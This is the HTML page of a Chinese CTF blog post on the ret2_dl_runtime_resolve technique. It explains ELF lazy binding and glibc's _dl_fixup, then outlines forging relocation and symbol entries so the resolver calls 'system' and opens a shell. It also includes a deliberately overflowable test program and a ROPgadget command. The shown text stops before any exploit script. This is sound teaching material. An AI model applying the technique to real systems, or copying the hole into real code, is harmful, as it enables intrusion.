@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 程序示例首先是一个程序： 12345#include&lt;stdio.h&gt;int main()&amp;#123;char buf[]&#x3D;&quot;Kirin\n&quot;;write(1,buf,strlen(buf));&amp;#125; 1gcc -m32 test.c -o test write调用过程可以看到，第一次调用write： 123call  0x8048380(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2_dl_runtime_resolve">
+<meta property="og:url" content="http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 程序示例首先是一个程序： 12345#include&lt;stdio.h&gt;int main()&amp;#123;char buf[]&#x3D;&quot;Kirin\n&quot;;write(1,buf,strlen(buf));&amp;#125; 1gcc -m32 test.c -o test write调用过程可以看到，第一次调用write： 123call  0x8048380(">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-7ae60107ffc9e00c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-651aea502d4c26d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-5d31bf2adc80fb5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-6eaea1bd3cf80164.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-d2d2b141a562f787.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-be89c931dd4e18cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2018-08-18T11:17:28.000Z">
+<meta property="article:modified_time" content="2018-08-18T11:20:02.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-7ae60107ffc9e00c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ret2_dl_runtime_resolve</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/09/13/unlink-Simple-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/16/TJCTF2018-Re-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&text=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&is_video=false&description=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ret2_dl_runtime_resolve&body=Check out this article: http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&title=ret2_dl_runtime_resolve" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/18/ret2-dl-runtime-resolve/&name=ret2_dl_runtime_resolve&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-程序示例"><span class="toc-number">1.</span> <span class="toc-text">0x01 程序示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#write调用过程"><span class="toc-number">1.1.</span> <span class="toc-text">write调用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Section信息"><span class="toc-number">2.</span> <span class="toc-text">0x02 Section信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dynamic"><span class="toc-number">2.1.</span> <span class="toc-text">.dynamic</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynstr"><span class="toc-number">2.2.</span> <span class="toc-text">.dynstr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynsym"><span class="toc-number">2.3.</span> <span class="toc-text">.dynsym</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel-plt"><span class="toc-number">2.4.</span> <span class="toc-text">.rel.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#延迟绑定"><span class="toc-number">2.5.</span> <span class="toc-text">延迟绑定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-runtime-resolve"><span class="toc-number">2.6.</span> <span class="toc-text">_dl_runtime_resolve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP："><span class="toc-number">3.1.</span> <span class="toc-text">ROP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#改写section信息"><span class="toc-number">3.2.</span> <span class="toc-text">改写section信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-利用示例"><span class="toc-number">3.3.</span> <span class="toc-text">0x04 利用示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP链信息："><span class="toc-number">3.4.</span> <span class="toc-text">ROP链信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">3.5.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ret2_dl_runtime_resolve
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-18T11:17:28.000Z" itemprop="datePublished">2018-08-18</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-程序示例"><a href="#0x01-程序示例" class="headerlink" title="0x01 程序示例"></a>0x01 程序示例</h3><p>首先是一个程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">char buf[]&#x3D;&quot;Kirin\n&quot;;</span><br><span class="line">write(1,buf,strlen(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 test.c -o test</span><br></pre></td></tr></table></figure>
+<h4 id="write调用过程"><a href="#write调用过程" class="headerlink" title="write调用过程"></a>write调用过程</h4><p><img src="https://upload-images.jianshu.io/upload_images/7434375-7ae60107ffc9e00c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="write"><br><img src="https://upload-images.jianshu.io/upload_images/7434375-651aea502d4c26d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="0x8048380"><br>可以看到，第一次调用write：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call  0x8048380(plt[&quot;write&quot;])</span><br><span class="line">0x8048380：</span><br><span class="line">0x8048380 &lt;write@plt&gt;:	jmp    DWORD PTR ds:0x804a018(got[&quot;write&quot;])</span><br></pre></td></tr></table></figure>
+<p>此时0x804a018处不是write函数的真实地址，而是指向0x8048386(plt[“write”]的下一条指令)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push    0x18</span><br><span class="line">jmp     0x8048340</span><br></pre></td></tr></table></figure>
+<p>看一下test的文件结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ readelf</span><br><span class="line">.interp &#x3D; 0x8048154</span><br><span class="line">.note.ABI-tag &#x3D; 0x8048168</span><br><span class="line">.note.gnu.build-id &#x3D; 0x8048188</span><br><span class="line">.gnu.hash &#x3D; 0x80481ac</span><br><span class="line">.dynsym &#x3D; 0x80481cc</span><br><span class="line">.dynstr &#x3D; 0x804823c</span><br><span class="line">.gnu.version &#x3D; 0x80482aa</span><br><span class="line">.gnu.version_r &#x3D; 0x80482b8</span><br><span class="line">.rel.dyn &#x3D; 0x80482e8</span><br><span class="line">.rel.plt &#x3D; 0x80482f0</span><br><span class="line">.init &#x3D; 0x8048310</span><br><span class="line">.plt &#x3D; 0x8048340</span><br><span class="line">.plt.got &#x3D; 0x8048390</span><br><span class="line">.text &#x3D; 0x80483a0</span><br><span class="line">.fini &#x3D; 0x8048574</span><br><span class="line">.rodata &#x3D; 0x8048588</span><br><span class="line">.eh_frame_hdr &#x3D; 0x8048590</span><br><span class="line">.eh_frame &#x3D; 0x80485bc</span><br><span class="line">.init_array &#x3D; 0x8049f08</span><br><span class="line">.fini_array &#x3D; 0x8049f0c</span><br><span class="line">.jcr &#x3D; 0x8049f10</span><br><span class="line">.dynamic &#x3D; 0x8049f14</span><br><span class="line">.got &#x3D; 0x8049ffc</span><br><span class="line">.got.plt &#x3D; 0x804a000</span><br><span class="line">.data &#x3D; 0x804a01c</span><br><span class="line">.bss &#x3D; 0x804a024</span><br></pre></td></tr></table></figure>
+<p>0x8048340处是plt[0](plt表开始地址)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x8048340:	push   DWORD PTR ds:0x804a004</span><br><span class="line">0x8048346:	jmp    DWORD PTR ds:0x804a008</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x804a004:	0xf7ffd918-&gt;link_map</span><br><span class="line">0x804a008:	0xf7fee000-&gt;_dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+<p>0x804a004：link_map=*(GOT+4),此处包含链接器的标识信息<br>0x804a008：_dl_runtime_resolve函数地址-&gt;*(GOT+8)-&gt;GOT[2]，动态链接器中的入口点<br>0xf7ffd918:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7ffd918:	0x00000000	0xf7ffdc04	0x08049f14	0xf7ffdc08</span><br></pre></td></tr></table></figure>
+<p>可以看到link_map中包含了.dynamic = 0x8049f14的指针</p>
+<h3 id="0x02-Section信息"><a href="#0x02-Section信息" class="headerlink" title="0x02 Section信息"></a>0x02 Section信息</h3><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><p><img src="https://upload-images.jianshu.io/upload_images/7434375-5d31bf2adc80fb5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dynamic"></p>
+<p>dynamic结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
+<p><strong>其中DT_STRTAB, DT_SYMTAB, DT_JMPREL分别指向.dynstr, .dynsym, .rel.plt节段</strong></p>
+<h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p><img src="https://upload-images.jianshu.io/upload_images/7434375-6eaea1bd3cf80164.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dynstr"></p>
+<p>开始为0<br><strong>然后包含动态链接所需的字符串(导入函数名等)(以\x00结尾)</strong></p>
+<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p><img src="https://upload-images.jianshu.io/upload_images/7434375-d2d2b141a562f787.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dynsym"></p>
+<p>结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; </span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym</span><br></pre></td></tr></table></figure>
+<p>注意两个字段：<br>st_name：符号名相对.dynstr起始的偏移(offset byte_8048278)<br>st_info：对于导入函数符号此处为0x12<br>(对于导入函数，其他处为0)</p>
+<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p><img src="https://upload-images.jianshu.io/upload_images/7434375-be89c931dd4e18cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".rel.plt"><br>结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; </span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+<p><strong>r_offset：指向对应got表的指针</strong><br><strong>r_info：r_info&gt;&gt;8后得到一个下标，对应此导入符号在.dynsym中的下标</strong></p>
+<h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h4><p>可以看到开始的时候第一次调用write函数<br>其实调用的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, reloc_arg)</span><br></pre></td></tr></table></figure>
+<p><strong>reloc_arg为导入函数在.rel.plt中的偏移(比如此处的push 0x18)</strong><br><strong>0x18=0+3*sizeof(Elf32_Rel)=0+3*0x8</strong><br>运行之后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x804a018(got[&quot;write&quot;]):	0xf7ed8b70</span><br><span class="line">vmmap:</span><br><span class="line">0xf7e03000 0xf7fb3000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0xf7ed8b70-0xf7e03000&#x3D;0xd5b70(write函数在libc中的偏移)</span><br></pre></td></tr></table></figure>
+<p>可以看到运行write之后，got表处对应write的地址已变为动态加载后write的真实地址</p>
+<h4 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h4><p>_dl_runtime_resolve在glibc-2.23/sysdeps/i386/dl-trampoline.S中使用汇编实现<br>看一下程序中的调用过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;xw 0x804a008</span><br><span class="line">0x804a008:	0xf7fee000</span><br><span class="line">gdb-peda$ x&#x2F;10i 0xf7fee000</span><br><span class="line">   0xf7fee000:	push   eax</span><br><span class="line">   0xf7fee001:	push   ecx</span><br><span class="line">   0xf7fee002:	push   edx</span><br><span class="line">   0xf7fee003:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fee007:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fee00b:	call   0xf7fe77e0</span><br><span class="line">   0xf7fee010:	pop    edx</span><br><span class="line">   0xf7fee011:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fee014:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fee017:	mov    eax,DWORD PTR [esp+0x4]</span><br></pre></td></tr></table></figure>
+<p>可以看到0xf7fee00b处call   0xf7fe77e0，即调用_dl_fixup，并且通过寄存器传参<br>_dl_fixup在glibc-2.23/elf/dl-runtime.c中实现<br>直接看主要函数(from大佬BruceFan的分析)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span><br><span class="line">    const PLTREL *const reloc &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    &#x2F;&#x2F; 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br><span class="line">    const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    &#x2F;&#x2F; 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT&#x3D;7</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    &#x2F;&#x2F; 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br><span class="line">    result &#x3D; _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line">    &#x2F;&#x2F; value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br><span class="line">    value &#x3D; DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br><span class="line">    &#x2F;&#x2F; 最后把value写入相应的GOT表条目中</span><br><span class="line">    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先通过link_map访问.dynamic节段，并获得.dynstr, .dynsym, .rel.plt节段的地址</span><br><span class="line">.rel.plt + reloc_arg(第二个参数(导入函数在.rel.plt中的偏移))求出对应函数重定位表项Elf32_Rel的指针</span><br><span class="line">利用此指针得到对应函数的r_info，r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针</span><br><span class="line">利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针</span><br><span class="line">在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针</span><br><span class="line">赋值给GOT表后，把控制权返还给write</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><h4 id="ROP："><a href="#ROP：" class="headerlink" title="ROP："></a>ROP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.控制eip为PLT[0]的地址</span><br><span class="line">2.构造传递reloc_arg(第二个)参数</span><br><span class="line">3.控制参数的大小，使rel的位置落在可控地址内</span><br><span class="line">4.伪造rel的内容，使dynsym落在可控地址内</span><br><span class="line">5.伪造dynsym的内容(主要是st_name)，使name落在可控地址内</span><br><span class="line">6.伪造name为任意库函数(一般获取shell，使用&quot;system&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="改写section信息"><a href="#改写section信息" class="headerlink" title="改写section信息"></a>改写section信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以改写.dynamic的DT_STRTAB</span><br><span class="line">或者直接改写.dynstr</span><br><span class="line">使最后传入_dl_runtime_resolve函数的字符串(函数名)为我们改写后的字符串(我们需要调用函数的库函数名)，而后成功运行函数(一般构造为&quot;system&quot;来获取shell)</span><br></pre></td></tr></table></figure>
+<h4 id="0x04-利用示例"><a href="#0x04-利用示例" class="headerlink" title="0x04 利用示例"></a>0x04 利用示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void pwn()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[16];</span><br><span class="line">    read(0, buf, 128);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">char name[]&#x3D;&quot;Kirin\n&quot;;</span><br><span class="line">write(1,name,strlen(name));</span><br><span class="line">pwn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test  -m32 -fno-stack-protector test.c</span><br></pre></td></tr></table></figure>
+<p>因为main直接返回方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>所以这里添加pwn函数并关闭保护便于利用ret2dl-resolve：<br>程序很简单，ret2_dl_runtime_resolve利用过程：</p>
+<h4 id="ROP链信息："><a href="#ROP链信息：" class="headerlink" title="ROP链信息："></a>ROP链信息：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary test --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
